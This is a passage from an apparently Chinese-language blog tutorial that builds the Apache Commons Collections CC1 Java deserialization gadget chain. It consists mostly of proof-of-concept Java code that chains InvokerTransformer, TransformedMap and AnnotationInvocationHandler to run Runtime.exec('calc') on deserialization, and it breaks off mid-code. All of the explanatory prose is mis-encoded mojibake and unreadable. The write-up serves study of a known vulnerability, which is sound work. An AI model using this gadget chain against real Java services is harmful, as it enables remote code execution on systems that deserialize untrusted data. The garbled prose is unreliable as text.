class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        invokerTransformer.transform(runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå¥ä¸ºä»€ä¹ˆè¦é‚£æ ·æ„é€ è·Ÿè¿›ç±»å’Œæ–¹æ³•çœ‹ä¸€ä¸‹å°±èƒ½ç†è§£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145403.png" alt="image-20230426214543314"><br>ç„¶åæ ¹æ®æœ€åä¸€å¥<code>invokerTransformer.transform(runtime);</code>å»å¯»æ‰¾ä¸åŒåå‡½æ•°ï¼Œè¿™é‡Œæˆ‘å‡ºäº†ä¸€ä¸ªé—®é¢˜å°±æ˜¯æˆ‘å…¨å±€æœç´¢ä¸åˆ°transformæ–¹æ³•çš„å¼•ç”¨ï¼ŒåŸå› æ˜¯åœ¨mavenä¸­æ²¡æœ‰ä¸‹è½½jaråŒ…çš„æºç ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæœä¸åˆ°ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/qq_26012495/article/details/109694133">è§£å†³</a>ï¼Œç„¶åfind usageså°±èƒ½æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•çš„å¼•ç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145831.png" alt="image-20230426214555687"><br>æœ€ç»ˆæ‰¾åˆ°TransformedMapç±»çš„checkSetValueæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262146939.png" alt="image-20230426214602802"><br>è·Ÿè¿›ä¸€ä¸‹valueTransformeræ–¹æ³•ï¼Œçœ‹åˆ°å®ƒçš„æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span>  </span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span>  </span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer     valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>(map);  </span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;  </span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªä¿æŠ¤ç±»å‹å˜é‡é€šè¿‡æ„é€ å‡½æ•°èµ‹å€¼ï¼Œç»§ç»­å¾€ä¸‹çœ‹æ‰¾åˆ°ä¸€ä¸ªpublicæ–¹æ³•è¿”å›äº†æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorateTransform</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="type">TransformedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);  </span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformed</span> <span class="operator">=</span> decorated.transformMap(map);  </span><br><span class="line">        decorated.clear();  </span><br><span class="line">        decorated.getMap().putAll(transformed);  <span class="comment">// avoids double transformation  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> decorated;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†å›å¿†ä¸€ä¸‹æˆ‘ä»¬ä¸€å¼€å§‹çš„å°¾éƒ¨<code>invokerTransformer.transform(runtime);</code>æ‰€ä»¥è¿™é‡Œè®©valueTransformerä¸ºinvokerTransformeræ˜¯ä¸æ˜¯å°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†ï¼Œä½†æ˜¯ç”±äºvalueTransformeræ˜¯protectedå‹æ‰€ä»¥æˆ‘ä»¬å°±è¦åˆ©ç”¨åå°„æ¥è·å¾—ï¼Œå¼€å§‹æ„é€ poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">        <span class="comment">//å¾—åˆ°ä¸€ä¸ªæ–°çš„TransformedMapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span><br><span class="line">        <span class="comment">//è·å¾—TransformedMapç±»çš„å¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line">  </span><br><span class="line">        checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        checkSetValueMethod.invoke(decorateMap,runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147170.png" alt="image-20230426214628370"><br>ç„¶åè¿™é‡Œ<code>.decorate</code>æ— æ³•å†ç»§ç»­å¾€å‰äº†ï¼Œæ‰€ä»¥å¾—é‡æ–°æ‰¾ä¸€æ¡ï¼Œè¿˜æ˜¯find usagesï¼Œä¸è¿‡è¿™æ¬¡æ˜¯æ‰¾checkSetValueçš„ç´¢å¼•ï¼Œç„¶åæ‰¾åˆ°äº†AbstractInputCheckedMapDecoratorç±»å³TransformedMapçš„çˆ¶ç±»<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147042.png" alt="image-20230426214744010"><br>é‡Œé¢çš„setValueæ–¹æ³•è°ƒç”¨äº†checkSetValueæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">    value = parent.checkSetValue(value);  </span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè°ƒç”¨äº†setValueçš„ç±»æ˜¯AbstractInputCheckedMapDecoratorçš„å†…éƒ¨ç±»MapEntry<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148400.png" alt="image-20230426214800338"><br>setValueæ–¹æ³•å°±æ˜¯å¯¹é”®å€¼å¯¹ä¸­çš„å€¼èµ‹å€¼çš„æ“ä½œï¼Œè·Ÿè¿›å»å³å¯çœ‹åˆ°<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148781.png" alt="image-20230426214809746"><br>ç„¶åç»§ç»­å¯¹setValueæŸ¥æ‰¾ç´¢å¼•find usagesï¼Œå¦‚æœæ˜¯readObjectç”¨äº†è¿™ä¸ªæ–¹æ³•é‚£ä¹ˆå°±æ‰¾åˆ°äº†å…¥å£<br>åœ¨è¿™é‡Œæ‰¾åˆ°å…¥å£ç±»AnnotationInvocationHandleré‡Œé¢çš„readObjectæ–¹æ³•è°ƒç”¨äº†setValueæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148807.png" alt="image-20230426214825669"><br>ä½†æ˜¯è¦è°ƒç”¨setValueæ–¹æ³•é¦–å…ˆå¾—æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸¤ä¸ªifï¼ŒmemberTypeä¸èƒ½ä¸ºç©ºï¼Œç¬¬äºŒä¸ªifé¦–å…ˆåˆ¤æ–­å˜é‡â€valueâ€æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹â€memberTypeâ€çš„å®ä¾‹ï¼Œè¿™é‡Œä½¿ç”¨äº†Javaä¸­çš„isInstanceæ–¹æ³•ã€‚å¦‚æœâ€valueâ€æ˜¯æŒ‡å®šç±»å‹çš„å®ä¾‹ï¼Œåˆ™æ¡ä»¶è¡¨è¾¾å¼çš„å€¼ä¸ºtrueï¼Œæ•´ä¸ªæ¡ä»¶è¯­å¥çš„æ‰§è¡Œç»“æœä¸ºfalseã€‚å¦‚æœâ€valueâ€ä¸æ˜¯æŒ‡å®šç±»å‹çš„å®ä¾‹ï¼Œæ¥ä¸‹æ¥å†åˆ¤æ–­â€valueâ€æ˜¯å¦æ˜¯ExceptionProxyç±»çš„å®ä¾‹ã€‚å¦‚æœâ€valueâ€æ˜¯ExceptionProxyç±»çš„å®ä¾‹ï¼Œåˆ™æ¡ä»¶è¡¨è¾¾å¼çš„å€¼ä¸ºtrueï¼Œæ•´ä¸ªæ¡ä»¶è¯­å¥çš„æ‰§è¡Œç»“æœä¸ºfalseã€‚<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148500.png" alt="image-20230426214837403"><br>æ¥ä¸‹æ¥æ„é€ exp</p><h2 id="TransformedMap-ç‰ˆCC1-EXP"><a href="#TransformedMap-ç‰ˆCC1-EXP" class="headerlink" title="TransformedMap ç‰ˆCC1 EXP"></a>TransformedMap ç‰ˆCC1 EXP</h2><p>ä¸‹é¢æ˜¯ç†æƒ³æƒ…å†µä¸‹çš„payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªpayloadè¿˜æœ‰ä¸‰ä¸ªé—®é¢˜æ²¡è§£å†³æ‰€ä»¥æ³¨å®šä¼šå¤±è´¥</p><blockquote><ol><li>Runtimeå¯¹è±¡ä¸èƒ½è¢«åºåˆ—åŒ–</li><li>setValueä¼ å…¥çš„å¯¹è±¡åº”è¯¥æ˜¯Runtimeå¯¹è±¡çš„ï¼Œè€Œåœ¨å®é™…æƒ…å†µä¸­ç¡®æ˜¯AnnotationTypeMismatchExceptionProxy<br>3.é€šè¿‡ä¸¤ä¸ªifåˆ¤æ–­</li></ol></blockquote><h3 id="è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–"><a href="#è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–" class="headerlink" title="è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–"></a>è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–</h3><p>Runtimeä¸èƒ½åºåˆ—åŒ–å› ä¸ºè¿™ä¸ªç±»æ²¡æœ‰Serializableæ¥å£ï¼Œä½†æ˜¯Runtime.classå¯ä»¥ï¼Œå…ˆå†™ä¸€ä¸ªæ™®é€šçš„åå°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line">        <span class="comment">//å°†runtimeå¼ºåˆ¶è½¬æ¢ä¸ºRuntimeå¯¹è±¡  </span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line">        <span class="comment">//è·å–execæ–¹æ³•  </span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  </span><br><span class="line">        method.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†<code>Runtime</code>æ”¹ä¸º<code>InvokerTransformer</code> è°ƒç”¨çš„æ–¹å¼ï¼Œè¿™é‡Œä¸ºäº†é¿å…å†—ä½™ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ChainedTransformerç±»å»å¥—ï¼ŒChainedTransformerç±»å®ç°äº†Transformeré“¾å¼è°ƒç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦ä¼ å…¥ä¸€ä¸ªTransformeræ•°ç»„ChainedTransformerå°±å¯ä»¥å®ç°ä¾æ¬¡çš„å»è°ƒç”¨æ¯ä¸€ä¸ªTransformerçš„transformæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æŠŠå®ƒä¸ <code>decorate</code> çš„é“¾å­ç»“åˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ç”¨äºè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½è¢«åºåˆ—åŒ–  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span 